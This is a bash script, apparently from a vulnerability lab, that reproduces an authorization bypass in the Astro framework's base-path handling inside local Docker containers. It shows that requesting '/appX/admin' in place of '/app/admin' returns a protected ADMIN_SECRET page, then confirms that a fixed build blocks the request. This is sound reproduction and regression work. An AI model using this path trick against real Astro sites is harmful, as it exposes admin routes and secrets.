#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
APP="${ROOT}/lab/base-app"
ARTIFACTS="${ROOT}/lab/artifacts"
LOG="${ARTIFACTS}/CVE-2026-84376-base-bypass.log"

mkdir -p "${ARTIFACTS}"
cd "${APP}"
if [[ ! -f package-lock.json ]]; then
  npm install --package-lock-only --ignore-scripts
fi

{
  echo "[*] Astro $(jq -r '.packages."node_modules/astro".version' package-lock.json)"
  echo "[*] Building vulnerable base-path application"
} | tee "${LOG}"

docker build --tag astro-base-bypass-vulnerable "${APP}" >>"${LOG}" 2>&1
container_id=$(docker run --rm -d -p 127.0.0.1:4323:4321 astro-base-bypass-vulnerable)
cleanup() {
  docker logs "${container_id}" >>"${LOG}" 2>&1 || true
  docker rm -f "${container_id}" >/dev/null 2>&1 || true
}
trap cleanup EXIT

for _ in $(seq 1 30); do
  curl -fsS http://127.0.0.1:4323/app/ >/dev/null && break
  sleep 1
done

normal=$(curl -sS -o /tmp/astro-base-normal -w '%{http_code}' http://127.0.0.1:4323/app/admin)
bypass=$(curl -sS -o /tmp/astro-base-bypass -w '%{http_code}' http://127.0.0.1:4323/appX/admin)
body=$(tr -d '\n' </tmp/astro-base-bypass)
{
  echo "[*] normal_status=${normal} bypass_status=${bypass}"
  echo "[*] bypass_body=${body}"
} | tee -a "${LOG}"

if [[ "${normal}" == "403" && "${bypass}" == "200" && "${body}" == *"ADMIN_SECRET"* ]]; then
  echo "[+] Reproduced base-path authorization bypass" | tee -a "${LOG}"
else
  echo "[-] Base-path bypass did not reproduce with this runtime shape" | tee -a "${LOG}"
  exit 1
fi

echo "[*] Building fixed Astro 7.2.4 control" | tee -a "${LOG}"
docker build -f Dockerfile.fixed -t astro-base-bypass-fixed "${APP}" >>"${LOG}" 2>&1
fixed_container_id=$(docker run --rm -d -p 127.0.0.1:4324:4321 astro-base-bypass-fixed)
fixed_cleanup() {
  docker logs "${fixed_container_id}" >>"${LOG}" 2>&1 || true
  docker rm -f "${fixed_container_id}" >/dev/null 2>&1 || true
  docker rm -f "${container_id}" >/dev/null 2>&1 || true
}
trap fixed_cleanup EXIT

for _ in $(seq 1 30); do
  curl -fsS http://127.0.0.1:4324/app/ >/dev/null && break
  sleep 1
done
fixed_normal=$(curl -sS -o /tmp/astro-base-fixed-normal -w '%{http_code}' http://127.0.0.1:4324/app/admin)
fixed_bypass=$(curl -sS -o /tmp/astro-base-fixed-bypass -w '%{http_code}' http://127.0.0.1:4324/appX/admin)
echo "[*] fixed_normal_status=${fixed_normal} fixed_bypass_status=${fixed_bypass}" | tee -a "${LOG}"

if [[ "${fixed_normal}" == "403" && "${fixed_bypass}" != "200" ]]; then
  echo "[+] Fixed control blocks the base-path bypass" | tee -a "${LOG}"
else
  echo "[-] Fixed control unexpectedly allowed the bypass" | tee -a "${LOG}"
  exit 1
fi
